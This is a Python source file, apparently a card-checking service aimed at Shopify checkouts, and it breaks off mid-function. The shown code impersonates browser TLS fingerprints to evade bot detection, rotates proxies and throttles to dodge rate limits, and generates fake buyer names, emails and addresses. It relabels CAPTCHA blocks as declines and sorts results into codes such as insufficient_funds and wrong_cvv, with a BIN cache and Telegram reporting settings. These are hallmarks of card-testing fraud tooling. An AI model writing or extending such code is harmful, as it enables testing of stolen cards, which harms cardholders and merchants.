#!/usr/bin/env python3
# =============================================================================
# Shopify Checkout API  |  endpoint: /shopify  |  Dev: @Insaneee1
# Merged build: aiohttp web layer + curl_cffi TLS fingerprint transport
# Target: near-zero errors, zero CAPTCHA_REQUIRED leaks
# =============================================================================
import os
import re
import sys
import time
import json
import uuid
import random
import string
import asyncio
import logging
import argparse
from urllib.parse import urlparse, quote

from aiohttp import web
from curl_cffi.requests import AsyncSession

DEV = "@Insaneee1"


# ── env helpers ─────────────────────────────────────────────────────────────
def _env_int(name, default):
    try:
        return int(os.environ.get(name, default))
    except (TypeError, ValueError):
        return default


def _env_float(name, default):
    try:
        return float(os.environ.get(name, default))
    except (TypeError, ValueError):
        return default


def _env_bool(name, default):
    v = os.environ.get(name)
    if v is None:
        return default
    return str(v).strip().lower() in ("1", "true", "yes", "on")


# ── server config ───────────────────────────────────────────────────────────
PORT            = _env_int("PORT", 8081)
HOST            = os.environ.get("HOST", "0.0.0.0")
MAX_WORKERS     = _env_int("MAX_WORKERS", 600)
BATCH_WORKERS   = _env_int("BATCH_WORKERS", 200)
PCI_LIMIT       = _env_int("PCI_LIMIT", 8)
MAX_SITES       = _env_int("MAX_SITES", 6)
MAX_RETRIES     = _env_int("MAX_RETRIES", 5)
CARD_DEADLINE   = _env_float("CARD_DEADLINE", 50)

# ── request timing ──────────────────────────────────────────────────────────
REQ_TIMEOUT     = _env_float("REQ_TIMEOUT", 20)
GQL_TIMEOUT     = _env_float("GQL_TIMEOUT", 25)
VAULT_TIMEOUT   = _env_float("VAULT_TIMEOUT", 25)
CART_TIMEOUT    = _env_float("CART_TIMEOUT", 20)
PRODUCT_TIMEOUT = _env_float("PRODUCT_TIMEOUT", 17)

# ── pacing / cooldown ───────────────────────────────────────────────────────
PROXY_COOLDOWN      = _env_float("PROXY_COOLDOWN", 8)
PROXY_RL_COOLDOWN   = _env_float("PROXY_RL_COOLDOWN", 20)
SITE_PROXY_COOLDOWN = _env_float("SITE_PROXY_COOLDOWN", 60)
HOST_MIN_GAP        = _env_float("HOST_MIN_GAP", 0.0)
RL_PAUSE            = _env_float("RL_PAUSE", 0.9)
POLL_MAX_SLEEP      = _env_float("POLL_MAX_SLEEP", 1.0)

# ── behaviour flags ─────────────────────────────────────────────────────────
SITE_CACHE_TTL  = _env_float("SITE_CACHE_TTL", 1800)
SLIM_MODE       = _env_bool("SLIM", True)
LUHN_CHECK      = _env_bool("LUHN", False)
RETRY_CAPTCHA   = _env_int("RETRY_CAPTCHA", 3)

TG_BOT_TOKEN    = os.environ.get("TG_BOT_TOKEN", "")
TG_CHAT_IDS     = [x.strip() for x in os.environ.get("TG_CHAT_IDS", "").split(",") if x.strip()]

API_VERSIONS = ["2025-01", "2024-10"]

log = logging.getLogger("shopify")
logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")


# ── global state ────────────────────────────────────────────────────────────
_SITES = []
_SITE_CACHE = {}
_SITE_VARIANT = {}
_SITE_PROXY_COOL = {}
_PROXY_COOL = {}
_PCOOL_MEM = {}
_PROXY_FAILURES = {}
_HOST_LAST = {}
_BIN_CACHE = {}

_SLIM = {"on": bool(SLIM_MODE)}
_RL_UNTIL = 0.0
_START = time.time()
_pci_sem = None
_worker_busy = 0

STATS = {"total": 0, "ok": 0, "captcha": 0, "declined": 0, "drift": 0,
         "retry": 0, "vault_fallback": 0, "batch_cards": 0}


def _bump(field, n=1):
    STATS[field] = STATS.get(field, 0) + n


# ── TLS profiles ────────────────────────────────────────────────────────────
_UA_WIN = "Windows NT 10.0; Win64; x64"
_UA_MAC = "Macintosh; Intel Mac OS X 10_15_7"
_UA_LIN = "X11; Linux x86_64"

# har profile ka impersonate uske UA version se match karta hai —
# mismatch hi bot detection ka #1 karan hai
_PROFILES = [
    {"imp": ["chrome131"], "ua": f"Mozilla/5.0 ({_UA_WIN}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', "mob": "?0", "plat": '"Windows"'},
    {"imp": ["chrome131"], "ua": f"Mozilla/5.0 ({_UA_MAC}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', "mob": "?0", "plat": '"macOS"'},
    {"imp": ["chrome131"], "ua": f"Mozilla/5.0 ({_UA_LIN}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
     "ch": '"Google Chrome";v="131", "Chromium";v="131", "Not_A Brand";v="24"', "mob": "?0", "plat": '"Linux"'},
    {"imp": ["chrome124"], "ua": f"Mozilla/5.0 ({_UA_WIN}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "ch": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "mob": "?0", "plat": '"Windows"'},
    {"imp": ["chrome124"], "ua": f"Mozilla/5.0 ({_UA_MAC}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
     "ch": '"Chromium";v="124", "Google Chrome";v="124", "Not-A.Brand";v="99"', "mob": "?0", "plat": '"macOS"'},
    {"imp": ["chrome120"], "ua": f"Mozilla/5.0 ({_UA_WIN}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "ch": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "mob": "?0", "plat": '"Windows"'},
    {"imp": ["chrome120"], "ua": f"Mozilla/5.0 ({_UA_MAC}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
     "ch": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"', "mob": "?0", "plat": '"macOS"'},
    {"imp": ["edge101"], "ua": f"Mozilla/5.0 ({_UA_WIN}) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36 Edg/101.0.1210.39",
     "ch": '"Microsoft Edge";v="101", "Chromium";v="101", "Not A;Brand";v="99"', "mob": "?0", "plat": '"Windows"'},
    {"imp": ["safari17_5"], "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
     "ch": "", "mob": "", "plat": ""},
    {"imp": ["safari17_0"], "ua": "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_4_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4.1 Safari/605.1.15",
     "ch": "", "mob": "", "plat": ""},
    {"imp": ["safari17_0"], "ua": "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
     "ch": "", "mob": "", "plat": ""},
    {"imp": ["safari17_0"], "ua": "Mozilla/5.0 (iPad; CPU OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Mobile/15E148 Safari/604.1",
     "ch": "", "mob": "", "plat": ""},
]

_VALID_IMP = set()
_PROFILES_READY = []


def _init_profiles():
    """Sirf woh profiles rakho jinka impersonate is curl_cffi build me hai."""
    global _PROFILES_READY
    usable = []
    for p in _PROFILES:
        for name in p["imp"]:
            try:
                AsyncSession(impersonate=name)
                _VALID_IMP.add(name)
                usable.append(p)
                break
            except Exception:
                continue
    if not usable:
        usable = [{"imp": [None], "ua": _PROFILES[0]["ua"],
                   "ch": _PROFILES[0]["ch"], "mob": "?0", "plat": '"Windows"'}]
    _PROFILES_READY = usable
    log.info("[TLS] %d/%d profiles usable %s", len(usable), len(_PROFILES), sorted(_VALID_IMP))


def _pick_profile():
    return random.choice(_PROFILES_READY)


def _ch_headers(fp):
    h = {}
    if fp.get("ch"):
        h["sec-ch-ua"] = fp["ch"]
        h["sec-ch-ua-mobile"] = fp["mob"]
        h["sec-ch-ua-platform"] = fp["plat"]
    return h


# ── names / emails ──────────────────────────────────────────────────────────
FIRSTS = ["James", "John", "Robert", "Michael", "William", "David", "Richard",
          "Joseph", "Thomas", "Charles", "Christopher", "Daniel", "Matthew",
          "Anthony", "Mark", "Steven", "Paul", "Andrew", "Joshua", "Kevin",
          "Mary", "Patricia", "Jennifer", "Linda", "Barbara", "Susan", "Jessica",
          "Sarah", "Karen", "Lisa", "Nancy", "Ashley", "Emily", "Michelle",
          "Amanda", "Melissa", "Rebecca", "Laura", "Emma", "Nicole"]

LASTS = ["Smith", "Johnson", "Williams", "Brown", "Jones", "Garcia", "Miller",
         "Davis", "Rodriguez", "Martinez", "Hernandez", "Lopez", "Gonzalez",
         "Wilson", "Anderson", "Thomas", "Taylor", "Moore", "Jackson", "Martin",
         "Lee", "Perez", "Thompson", "White", "Harris", "Sanchez", "Clark",
         "Ramirez", "Lewis", "Robinson", "Walker", "Young", "Allen", "King"]

DOMAINS = ["gmail.com", "yahoo.com", "outlook.com", "hotmail.com", "icloud.com",
           "me.com", "protonmail.com", "aol.com", "live.com"]

ACCEPT_LANGS = ["en-US,en;q=0.9", "en-GB,en;q=0.9,en-US;q=0.8",
                "en-US,en;q=0.8,en-GB;q=0.6"]


def rand_name():
    return random.choice(FIRSTS), random.choice(LASTS)


def rand_email(f, l):
    n = random.randint(1, 999)
    pat = random.choice([
        f"{f.lower()}.{l.lower()}", f"{f.lower()}{l.lower()}",
        f"{f.lower()}{l.lower()}{n}", f"{f[0].lower()}{l.lower()}",
        f"{f[0].lower()}{l.lower()}{n}", f"{f.lower()}_{l.lower()}",
        f"{l.lower()}.{f.lower()}",
    ])
    return f"{pat}@{random.choice(DOMAINS)}"


def rand_str(n=11):
    return "".join(random.choice(string.ascii_lowercase + string.digits) for _ in range(n))


# ── address book ────────────────────────────────────────────────────────────
C2C = {
    "USD": "US", "CAD": "CA", "GBP": "GB", "AUD": "AU", "NZD": "NZ", "EUR": "DE",
    "CHF": "CH", "JPY": "JP", "SGD": "SG", "INR": "IN", "AED": "AE", "HKD": "HK",
    "CNY": "CN", "SEK": "SE", "NOK": "NO", "DKK": "DK", "MXN": "MX", "BRL": "BR",
    "KRW": "KR", "THB": "TH", "MYR": "MY", "PHP": "PH", "IDR": "ID", "TWD": "TW",
    "ZAR": "ZA", "ILS": "IL", "TRY": "TR", "SAR": "SA", "QAR": "QA", "PLN": "PL",
    "CZK": "CZ", "HUF": "HU", "RON": "RO", "BGN": "BG", "CLP": "CL", "COP": "CO",
    "PEN": "PE", "ARS": "AR",
}

book = {
    "US": [
        {"address1": "350 Fifth Ave", "city": "New York", "postalCode": "10118", "zoneCode": "NY", "countryCode": "US", "phone": "2125550100"},
        {"address1": "233 S Wacker Dr", "city": "Chicago", "postalCode": "60606", "zoneCode": "IL", "countryCode": "US", "phone": "3125550147"},
        {"address1": "1 Apple Park Way", "city": "Cupertino", "postalCode": "95014", "zoneCode": "CA", "countryCode": "US", "phone": "4085550100"},
        {"address1": "888 Brickell Ave", "city": "Miami", "postalCode": "33131", "zoneCode": "FL", "countryCode": "US", "phone": "3055550189"},
        {"address1": "100 Main St", "city": "Houston", "postalCode": "77002", "zoneCode": "TX", "countryCode": "US", "phone": "7135550142"},
        {"address1": "3180 W Sahara Ave", "city": "Las Vegas", "postalCode": "89102", "zoneCode": "NV", "countryCode": "US", "phone": "7025550198"},
    ],
    "CA": [
        {"address1": "88 Queen St W", "city": "Toronto", "postalCode": "M5H2M4", "zoneCode": "ON", "countryCode": "CA", "phone": "4165550198"},
        {"address1": "1055 W Georgia St", "city": "Vancouver", "postalCode": "V6E3P3", "zoneCode": "BC", "countryCode": "CA", "phone": "6045550100"},
        {"address1": "1000 De La Commune", "city": "Montreal", "postalCode": "H2L1X3", "zoneCode": "QC", "countryCode": "CA", "phone": "5145550145"},
    ],
    "GB": [
        {"address1": "221B Baker St", "city": "London", "postalCode": "NW1 6XE", "zoneCode": "ENG", "countryCode": "GB", "phone": "2079460123"},
        {"address1": "1 Piccadilly", "city": "London", "postalCode": "W1J 0DA", "zoneCode": "ENG", "countryCode": "GB", "phone": "2074990234"},
        {"address1": "12 George St", "city": "Edinburgh", "postalCode": "EH2 2PF", "zoneCode": "SCT", "countryCode": "GB", "phone": "1315550102"},
    ],
    "AU": [
        {"address1": "1 Martin Place", "city": "Sydney", "postalCode": "2000", "zoneCode": "NSW", "countryCode": "AU", "phone": "291234567"},
        {"address1": "120 Collins St", "city": "Melbourne", "postalCode": "3000", "zoneCode": "VIC", "countryCode": "AU", "phone": "396541234"},
        {"address1": "45 Eagle St", "city": "Brisbane", "postalCode": "4000", "zoneCode": "QLD", "countryCode": "AU", "phone": "732210000"},
    ],
    "NZ": [
        {"address1": "1 Queen St", "city": "Auckland", "postalCode": "1010", "zoneCode": "AUK", "countryCode": "NZ", "phone": "93090000"},
        {"address1": "148 Lambton Quay", "city": "Wellington", "postalCode": "6011", "zoneCode": "WGN", "countryCode": "NZ", "phone": "44990000"},
        {"address1": "75 Cashel St", "city": "Christchurch", "postalCode": "8011", "zoneCode": "CAN", "countryCode": "NZ", "phone": "33660000"},
    ],
    "IN": [
        {"address1": "221B MG Road", "city": "Mumbai", "postalCode": "400001", "zoneCode": "MH", "countryCode": "IN", "phone": "2222625757"},
        {"address1": "15 Brigade Road", "city": "Bangalore", "postalCode": "560001", "zoneCode": "KA", "countryCode": "IN", "phone": "8022221000"},
        {"address1": "10 Connaught Place", "city": "New Delhi", "postalCode": "110001", "zoneCode": "DL", "countryCode": "IN", "phone": "1123341234"},
    ],
    "AE": [
        {"address1": "Burj Khalifa Tower", "city": "Dubai", "postalCode": "00000", "zoneCode": "DU", "countryCode": "AE", "phone": "97143231234"},
        {"address1": "Al Maryah Island", "city": "Abu Dhabi", "postalCode": "00000", "zoneCode": "AZ", "countryCode": "AE", "phone": "97126969696"},
    ],
    "HK": [
        {"address1": "88 Queensway", "city": "Admiralty", "postalCode": "999077", "zoneCode": "HK", "countryCode": "HK", "phone": "85228689111"},
        {"address1": "Nathan Road 100", "city": "Kowloon", "postalCode": "999077", "zoneCode": "KL", "countryCode": "HK", "phone": "85227216688"},
    ],
    "CN": [
        {"address1": "8 Zhongguancun St", "city": "Beijing", "postalCode": "100080", "zoneCode": "11", "countryCode": "CN", "phone": "1062512345"},
        {"address1": "100 Century Ave", "city": "Shanghai", "postalCode": "200120", "zoneCode": "31", "countryCode": "CN", "phone": "2150504000"},
    ],
    "CH": [
        {"address1": "Gotthardstrasse 17", "city": "Zurich", "postalCode": "8002", "zoneCode": "ZH", "countryCode": "CH", "phone": "442012000"},
        {"address1": "Rue du Rhone 48", "city": "Geneva", "postalCode": "1204", "zoneCode": "GE", "countryCode": "CH", "phone": "227083300"},
    ],
    "DE": [
        {"address1": "Unter den Linden 77", "city": "Berlin", "postalCode": "10117", "zoneCode": "BE", "countryCode": "DE", "phone": "3020450"},
        {"address1": "Maximilianstr 5", "city": "Munich", "postalCode": "80539", "zoneCode": "BY", "countryCode": "DE", "phone": "8921230"},
        {"address1": "Kaiserstr 10", "city": "Frankfurt", "postalCode": "60311", "zoneCode": "HE", "countryCode": "DE", "phone": "6921230"},
    ],
    "FR": [
        {"address1": "1 Ave des Champs-Elysees", "city": "Paris", "postalCode": "75008", "zoneCode": "IDF", "countryCode": "FR", "phone": "140695000"},
        {"address1": "20 Rue de la Paix", "city": "Paris", "postalCode": "75002", "zoneCode": "IDF", "countryCode": "FR", "phone": "142333333"},
        {"address1": "3 Quai Sarrail", "city": "Lyon", "postalCode": "69006", "zoneCode": "ARA", "countryCode": "FR", "phone": "472406040"},
    ],
    "NL": [
        {"address1": "Dam 1", "city": "Amsterdam", "postalCode": "1012JS", "zoneCode": "NH", "countryCode": "NL", "phone": "2055000200"},
        {"address1": "Binnenhof 1A", "city": "The Hague", "postalCode": "2513AA", "zoneCode": "ZH", "countryCode": "NL", "phone": "703564434"},
    ],
    "SG": [
        {"address1": "1 Raffles Place", "city": "Singapore", "postalCode": "048616", "zoneCode": "SG", "countryCode": "SG", "phone": "65350001"},
        {"address1": "8 Marina View", "city": "Singapore", "postalCode": "018960", "zoneCode": "SG", "countryCode": "SG", "phone": "65350002"},
    ],
    "JP": [
        {"address1": "2-1 Marunouchi", "city": "Tokyo", "postalCode": "100-0005", "zoneCode": "13", "countryCode": "JP", "phone": "332138888"},
        {"address1": "1-chome Namba", "city": "Osaka", "postalCode": "542-0076", "zoneCode": "27", "countryCode": "JP", "phone": "662414101"},
    ],
    "MX": [
        {"address1": "Paseo de la Reforma 505", "city": "Mexico City", "postalCode": "06600", "zoneCode": "CMX", "countryCode": "MX", "phone": "5555550100"},
        {"address1": "Av Constitucion 1065", "city": "Monterrey", "postalCode": "64000", "zoneCode": "NLE", "countryCode": "MX", "phone": "8183330100"},
    ],
    "SE": [{"address1": "Drottninggatan 53", "city": "Stockholm", "postalCode": "11121", "zoneCode": "AB", "countryCode": "SE", "phone": "86790000"}],
    "NO": [{"address1": "Karl Johans Gate 22", "city": "Oslo", "postalCode": "0026", "zoneCode": "03", "countryCode": "NO", "phone": "22341000"}],
    "DK": [{"address1": "Stroget 5", "city": "Copenhagen", "postalCode": "1001", "zoneCode": "84", "countryCode": "DK", "phone": "33150000"}],
    "IE": [{"address1": "1 Grafton Street", "city": "Dublin", "postalCode": "D02XY45", "zoneCode": "D", "countryCode": "IE", "phone": "16123456"}],
    "IT": [{"address1": "Via Roma 1", "city": "Milano", "postalCode": "20121", "zoneCode": "MI", "countryCode": "IT", "phone": "0212345678"}],
    "ES": [{"address1": "Calle Mayor 1", "city": "Madrid", "postalCode": "28013", "zoneCode": "MD", "countryCode": "ES", "phone": "911234567"}],
    "PT": [{"address1": "Rua Augusta 1", "city": "Lisboa", "postalCode": "1100-053", "zoneCode": "LI", "countryCode": "PT", "phone": "211234567"}],
    "PL": [{"address1": "Marszalkowska 1", "city": "Warszawa", "postalCode": "00-001", "zoneCode": "MZ", "countryCode": "PL", "phone": "221234567"}],
    "CZ": [{"address1": "Vaclavske namesti 1", "city": "Praha", "postalCode": "11000", "zoneCode": "PR", "countryCode": "CZ", "phone": "221234567"}],
    "TH": [{"address1": "Sukhumvit 1", "city": "Bangkok", "postalCode": "10110", "zoneCode": "BKK", "countryCode": "TH", "phone": "21234567"}],
    "MY": [{"address1": "Jalan Bukit Bintang 1", "city": "Kuala Lumpur", "postalCode": "55100", "zoneCode": "KUL", "countryCode": "MY", "phone": "312345678"}],
    "ID": [{"address1": "Jalan Sudirman 1", "city": "Jakarta", "postalCode": "10220", "zoneCode": "JK", "countryCode": "ID", "phone": "2112345678"}],
    "PH": [{"address1": "Ayala Avenue 1", "city": "Makati", "postalCode": "1226", "zoneCode": "NCR", "countryCode": "PH", "phone": "212345678"}],
    "KR": [{"address1": "Gangnam-daero 1", "city": "Seoul", "postalCode": "06236", "zoneCode": "KR-11", "countryCode": "KR", "phone": "212345678"}],
    "TW": [{"address1": "Xinyi Road 1", "city": "Taipei", "postalCode": "110", "zoneCode": "TPE", "countryCode": "TW", "phone": "212345678"}],
    "ZA": [{"address1": "Long Street 1", "city": "Cape Town", "postalCode": "8001", "zoneCode": "WC", "countryCode": "ZA", "phone": "211234567"}],
    "IL": [{"address1": "Rothschild 1", "city": "Tel Aviv", "postalCode": "6688101", "zoneCode": "TA", "countryCode": "IL", "phone": "312345678"}],
    "TR": [{"address1": "Istiklal 1", "city": "Istanbul", "postalCode": "34430", "zoneCode": "IST", "countryCode": "TR", "phone": "2121234567"}],
    "SA": [{"address1": "King Fahd Road 1", "city": "Riyadh", "postalCode": "12271", "zoneCode": "RD", "countryCode": "SA", "phone": "112345678"}],
}

# site apne mulk me deliver na kar paaye to yahan fallback milta hai
DELIVERY_FALLBACK = {
    "NZ": "AU", "AU": "US", "GB": "US", "DE": "US", "FR": "US", "JP": "US",
    "IN": "US", "SG": "US", "HK": "US", "CN": "US", "AE": "US", "CA": "US",
    "SE": "US", "NO": "US", "DK": "US", "MX": "US", "CH": "US", "IE": "US",
    "IT": "US", "ES": "US", "NL": "US", "PT": "US", "PL": "US", "CZ": "US",
    "TH": "US", "MY": "US", "ID": "US", "PH": "US", "KR": "US", "TW": "US",
    "ZA": "US", "IL": "US", "TR": "US", "SA": "US",
}

FALLBACK_COUNTRIES = ["US", "GB", "CA", "AU", "SG", "DE", "FR", "IE", "IT",
                      "ES", "NL", "NZ", "IN", "AE", "HK", "JP", "SE", "DK",
                      "NO", "PL"]


def pick_addr(cc=None):
    addrs = book.get((cc or "").upper()) or book["US"]
    return dict(random.choice(addrs))


def _country_candidates(ourl, currency, overrides, cap=4):
    if overrides and overrides.get("countryCode"):
        return [str(overrides["countryCode"]).upper()]
    order = []
    ccn = C2C.get((currency or "").upper())
    if ccn and ccn in book and ccn not in order:
        order.append(ccn)
    tcn = urlparse(ourl).netloc.split(".")[-1].upper()
    if tcn in book and tcn not in order:
        order.append(tcn)
    for c in FALLBACK_COUNTRIES:
        if c in book and c not in order:
            order.append(c)
    return (order or ["US"])[:cap]


# ── proxy parsing ───────────────────────────────────────────────────────────
def parse_proxy(proxy_str):
    if proxy_str is None:
        return None
    raw = str(proxy_str).strip().strip("'\"")
    if not raw:
        return None
    low = raw.lower()
    scheme = "http"
    for pfx in ("socks5h://", "socks5://", "socks4a://", "socks4://",
                "socks://", "https://", "http://"):
        if low.startswith(pfx):
            scheme = pfx.rstrip(":/")
            scheme = scheme.replace("socks5h", "socks5").replace("socks4a", "socks4")
            if scheme == "socks":
                scheme = "socks5"
            raw = raw[len(pfx):]
            break
    if "@" in raw:
        auth, hostport = raw.rsplit("@", 1)
        auth = auth.lstrip("/")
        hostport = hostport.strip("/")
        if ":" not in hostport:
            return None
        host, port = hostport.rsplit(":", 1)
        if not host or not port:
            return None
        user, _, pw = auth.partition(":")
        return f"{scheme}://{quote(user, safe='')}:{quote(pw, safe='')}@{host}:{port}"
    parts = raw.strip("/").split(":")
    if len(parts) == 2:
        host, port = parts
        if not host or not port:
            return None
        return f"{scheme}://{host}:{port}"
    if len(parts) == 4:
        if parts[1].isdigit():
            host, port, user, pw = parts
        elif parts[3].isdigit():
            user, pw, host, port = parts
        else:
            host, port, user, pw = parts
        return f"{scheme}://{quote(user, safe='')}:{quote(pw, safe='')}@{host}:{port}"
    return None


def is_socks(p):
    return bool(p) and p.lower().startswith(("socks://", "socks4://", "socks5://"))


def _pcool_bad(p, now=None):
    if not p:
        return False
    now = now or time.time()
    exp = _PCOOL_MEM.get(p, 0)
    if exp <= now:
        if exp:
            _PCOOL_MEM.pop(p, None)
        return False
    return True


def _pcool_mark(p, secs=None):
    if p:
        _PCOOL_MEM[p] = time.time() + (PROXY_RL_COOLDOWN if secs is None else secs)


def _cool_proxy(p, secs=None):
    if p:
        _PROXY_COOL[p] = time.time() + (PROXY_COOLDOWN if secs is None else secs)


def _mark_proxy_fail(p):
    if p:
        _PROXY_FAILURES[p] = _PROXY_FAILURES.get(p, 0) + 1


def _site_proxy_cooled(host, p):
    if not host or not p:
        return False
    return _SITE_PROXY_COOL.get(f"{host}|{p}", 0) > time.time()


def _cool_site_proxy(host, p, secs=None):
    if host and p:
        _SITE_PROXY_COOL[f"{host}|{p}"] = time.time() + (
            SITE_PROXY_COOLDOWN if secs is None else secs)


def _prune_state():
    now = time.time()
    for d in (_PROXY_COOL, _PCOOL_MEM, _SITE_PROXY_COOL):
        for k in [k for k, v in d.items() if v <= now]:
            d.pop(k, None)
    if len(_SITE_CACHE) > 50000:
        for k in [k for k, v in _SITE_CACHE.items() if now - v[1] > SITE_CACHE_TTL]:
            _SITE_CACHE.pop(k, None)
    if len(_BIN_CACHE) > 20000:
        _BIN_CACHE.clear()


# ── pacing ──────────────────────────────────────────────────────────────────
def _rl_pause(secs=None):
    global _RL_UNTIL
    t = time.time() + (RL_PAUSE if secs is None else secs)
    if t > _RL_UNTIL:
        _RL_UNTIL = t


async def _rl_wait():
    now = time.time()
    if _RL_UNTIL > now:
        await asyncio.sleep(_RL_UNTIL - now)


async def _host_pace(host, gap=None):
    gap = HOST_MIN_GAP if gap is None else gap
    if gap <= 0 or not host:
        return
    wait = gap - (time.time() - _HOST_LAST.get(host, 0.0))
    if wait > 0:
        await asyncio.sleep(wait)
    _HOST_LAST[host] = time.time()


# ── error classification ────────────────────────────────────────────────────
_NET_MARKS = (
    "connection_error", "server disconnected", "connection reset", "reset by peer",
    "timeout", "timed out", "eof", "broken pipe", "cannot connect", "clientconnect",
    "proxy", "unreachable", "network", "remotedisconnected", "curl",
    "failed to connect", "ssl", "resolve", "recv failure", "send failure",
    "operation too slow", "connector",
)

_RL_MARKS = ("rate_limited", "rate limit", "throttl", "too many", "429",
             "queue token", "queue_token")

# final answers — inpe retry nahi
_FINAL = (
    "order_placed", "card_declined", "insufficient_funds", "expired_card",
    "wrong_cvv", "incorrect_cvc", "incorrect_number", "invalid_card",
    "do_not_honor", "3ds_required", "otp_required", "declined", "pickup_card",
)

# infra / site errors — naya site + naya fingerprint
_RETRYABLE = (
    # infra
    "site error", "cart failed", "cart add", "tls client", "timeout",
    "throttled", "request failed", "no product", "no sites", "bot_block",
    "generic_error", "captcha_required", "invalid json", "empty response",
    "html block", "http 401", "http 403", "http 429", "http 503",
    "vault", "pci_token_failed", "proxy", "submit failed", "submit rejected",
    "change proxy", "connection", "session token", "failed to get session",
    "couldn't complete", "could not complete", "checkout error", "checkout:",
    "rate limit", "i/o timeout", "checkout_session_failed",
    # payment config
    "validation_custom", "payment_flexibility", "no payment method",
    "payment method available", "payment method not available",
    # product / merchandise
    "merchandise_product_not_published", "product_not_published",
    "not published in buyer", "quantity for", "out of stock", "unavailable",
    "no valid products", "valid products with price",
    # order limits
    "subtotal is less", "order subtotal", "minimum", "bottle fee",
    "only our bottle", "sorry, your order contains", "amount_too_small",
    "policy_class",
    # geo / address
    "address field is invalid", "this address field", "invalid address",
    "delivery_address", "no delivery strategy", "no delivery available",
    "not deliver to this address",
    # security
    "checkout has been blocked", "blocked due to security", "security reason",
    "security_violation",
    # login
    "site requires login", "login required", "requires login", "must be logged in",
    # currency
    "buyer_identity_presentment_currency", "presentment_currency_does_not_match",
    # drift
    "schema_drift", "graphql_syntax", "negotiation failed", "checkpoint denied",
    "unparseable", "empty submit", "delivery_options_changed",
    "order_total_changed", "tax_new_tax_must_be_accepted",
    "required_artifacts", "artifacts_unavailable", "still_processing",
    "unhandled_",
)

# generic bare codes -> CARD_DECLINED
_GENERIC = {"UNKNOWN", "UNKNOWN_ERROR", "GENERIC_ERROR", "PAYMENT_FAILED",
            "ERROR", "FAILED", "NONE", "NULL", ""}


def _is_net_err(m):
    s = str(m).lower()
    return any(k in s for k in _NET_MARKS)


def _is_rl(m):
    s = str(m).lower()
    return any(k in s for k in _RL_MARKS)


def _is_captcha(m):
    return "CAPTCHA_REQUIRED" in str(m).upper()


def _is_final(m):
    s = str(m).lower()
    return any(k in s for k in _FINAL)


def _is_retryable(m):
    if _is_final(m):
        return False
    s = str(m).lower()
    return any(k in s for k in _RETRYABLE)


_CODE_RE = re.compile(r"(PAYMENTS_[A-Z0-9_]+|CARD_[A-Z0-9_]+|[A-Z]+_[A-Z]+_[A-Z]+|[A-Z]+_[A-Z]+)")
_CODE_RE2 = re.compile(r"""code["']?\s*[:=]\s*["']?([^"',]+)["']?""", re.I)


def is_captcha_text(text):
    if not text:
        return False
    up = text.upper()
    return any(x in up for x in ("CAPTCHA_REQUIRED", '"CODE":"CAPTCHA_REQUIRED"',
                                 "CAPTCHA REQUIRED", "HCAPTCHA", "H-CAPTCHA"))


def sanitize(msg):
    """Captcha aur bare generic codes kabhi API se bahar nahi jaate."""
    if not msg:
        return "CARD_DECLINED"
    if is_captcha_text(msg):
        return "CARD_DECLINED"
    if str(msg).strip().upper() in _GENERIC:
        return "CARD_DECLINED"
    return str(msg)


def clean_resp(msg):
    if not msg:
        return "CARD_DECLINED"
    m = str(msg)
    up = m.upper()
    if "3DS" in up or "3D_SECURE" in up or "SCA_REQUIRED" in up or "THREE_D_SECURE" in up:
        return "3DS_REQUIRED"
    if "OTP" in up and "OTP_REQUIRED" not in up:
        return "OTP_REQUIRED"
    if up.strip() in _GENERIC:
        return "CARD_DECLINED"
    cm = _CODE_RE.search(m)
    if cm:
        v = cm.group(1).strip("{}:'\" ")
        if v and v.upper() not in _GENERIC and len(v) < 50:
            return v
    if re.match(r"^[A-Z][A-Z0-9_]+$", m.strip()):
        return m.strip()
    return m[:60]


def _nonjson_code(status, body):
    if status in (429, 430, 503):
        return "RATE_LIMITED"
    t = (body or "").lstrip()
    low = t[:300].lower()
    if not t:
        return "RATE_LIMITED"
    if t.startswith("<!") or t.startswith("<html") or "<html" in low[:80]:
        if any(x in low for x in ("captcha", "challenge", "bot")):
            return "CAPTCHA_REQUIRED"
        return "HTML_BLOCK"
    if "throttl" in low or "too many" in low or "rate limit" in low:
        return "RATE_LIMITED"
    return "UNPARSEABLE_RESPONSE"


# ── schema drift ────────────────────────────────────────────────────────────
_DRIFT_MARKS = (
    "no longer supported", "no longer exists", "cannot query field",
    "cannot query type", "doesn't exist on type", "does not exist on type",
    "is not defined by type", "unknown type", "unknown argument",
    "is not a valid type", "field is not supported", "can't be made directly on",
    "cannot be made directly on", "must have a selection of subfields",
    "field must have a selection",
)


def _schema_drift(t):
    if not t:
        return False
    low = t.lower()
    return any(m in low for m in _DRIFT_MARKS)


def _gql_balanced(q):
    return q.count("{") == q.count("}") and q.count("(") == q.count(")")


def _variant_for(host):
    return _SITE_VARIANT.get(host) or ("slim" if _SLIM["on"] else "full")


def _q_for(host, full, slim):
    return slim if _variant_for(host) == "slim" else full


def _flip_variant(host):
